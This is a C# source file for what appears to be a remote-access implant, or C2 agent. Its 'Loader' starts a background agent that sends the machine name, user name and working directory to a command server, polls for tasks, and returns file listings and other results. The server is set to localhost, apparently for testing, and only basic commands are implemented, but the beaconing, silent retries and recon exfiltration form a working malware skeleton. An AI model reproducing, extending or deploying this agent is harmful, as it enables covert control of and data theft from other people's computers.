using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

    public class Loader
    {
        public static void Run(string args)
        {
            Thread mainThread = new Thread(new ThreadStart(Agent.Start));
            mainThread.IsBackground = false;
            mainThread.Start();
        }
    }

    public static class Agent
    {
        private const string ServerUrl = "http://localhost:5000";
        private const int PollIntervalMs = 3000;
        private static string clientId = Guid.NewGuid().ToString().Substring(0, 8);

        public static void Start()
        {
            // TLS 1.2
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            while (true)
            {
                try { Register(); break; }
                catch { Thread.Sleep(5000); }
            }

            while (true)
            {
                try
                {
                    string rawTask = PollTask();
                    if (!string.IsNullOrEmpty(rawTask))
                    {
                        string taskId = GetJsonValue(rawTask, "id");
                        string result = HandleTask(rawTask);
                        SubmitResult(taskId, result);
                    }
                }
                catch { /* retry */ }
                Thread.Sleep(PollIntervalMs);
            }
        }

        static void Register()
        {
            using (var wc = new WebClient())
            {
                // Ручная сборка JSON
                string json = string.Format(
                    "{{\"client_id\":\"{0}\",\"hostname\":\"{1}\",\"username\":\"{2}\",\"os\":\"windows\",\"cwd\":\"{3}\"}}",
                    clientId, Environment.MachineName, Environment.UserName, Directory.GetCurrentDirectory().Replace("\\", "\\\\"));

                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.UploadString(ServerUrl + "/api/register", json);
            }
        }

        static string PollTask()
        {
            using (var wc = new WebClient())
            {
                string resp = wc.DownloadString(ServerUrl + "/api/tasks/" + clientId);
                // Предполагаем, что сервер возвращает {"task": {"id":"...","command":"..."}} или {}
                if (resp.Contains("\"task\"") && !resp.Contains("\"task\":null"))
                    return resp;
                return null;
            }
        }

        static void SubmitResult(string taskId, string resultJson)
        {
            using (var wc = new WebClient())
            {
                string payload = string.Format("{{\"task_id\":\"{0}\",\"result\":{1}}}", taskId, resultJson);
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.UploadString(ServerUrl + "/api/results/" + clientId, payload);
            }
        }

        static string HandleTask(string taskRaw)
        {
            string cmd = GetJsonValue(taskRaw, "command");
            string args = GetJsonValue(taskRaw, "args");

            switch (cmd)
            {
                case "ls": return DoLs(args);
                case "pwd": return string.Format("{{\"output\":\"{0}\"}}", Directory.GetCurrentDirectory().Replace("\\", "\\\\"));
                case "ping": return "{\"output\":\"pong\"}";
                default: return string.Format("{{\"error\":\"Unknown command: {0}\"}}", cmd);
            }
        }

        // Примитивный парсер JSON значений (только для строк и простых типов)
        static string GetJsonValue(string json, string key)
        {
            string searchKey = "\"" + key + "\":\"";
            int start = json.IndexOf(searchKey);
            if (start == -1)
            {
                // Попытка найти без кавычек у значения (для чисел/null)
                searchKey = "\"" + key + "\":";
                start = json.IndexOf(searchKey);
                if (start == -1) return "";
                start += searchKey.Length;
            }
            else
            {
                start += searchKey.Length;
            }

            int end = json.IndexOf("\"", start);
            if (end == -1) end = json.IndexOf(",", start);
            if (end == -1) end = json.IndexOf("}", start);

            return json.Substring(start, end - start).Trim(' ', '"');
        }

        static string DoLs(string path)
        {
            try
            {
                var target = string.IsNullOrEmpty(path) ? "." : path;
                var fullPath = Path.GetFullPath(target);
                StringBuilder sb = new StringBuilder();
                sb.Append("{\"entries\":[");

                string[] dirs = Directory.GetDirectories(fullPath);
                string[] files = Directory.GetFiles(fullPath);

                for (int i = 0; i < dirs.Length; i++)
                {
                    sb.Append(string.Format("{{\"name\":\"{0}\",\"is_dir\":true}}", Path.GetFileName(dirs[i])));
                    if (i < dirs.Length - 1 || files.Length > 0) sb.Append(",");
                }
                for (int i = 0; i < files.Length; i++)
                {
                    sb.Append(string.Format("{{\"name\":\"{0}\",\"is_dir\":false}}", Path.GetFileName(files[i])));
                    if (i < files.Length - 1) sb.Append(",");
                }

                sb.AppendFormat("],\"path\":\"{0}\"}}", fullPath.Replace("\\", "\\\\"));
                return sb.ToString();
            }
            catch (Exception ex) { return string.Format("{{\"error\":\"{0}\"}}", ex.Message); }
        }
    }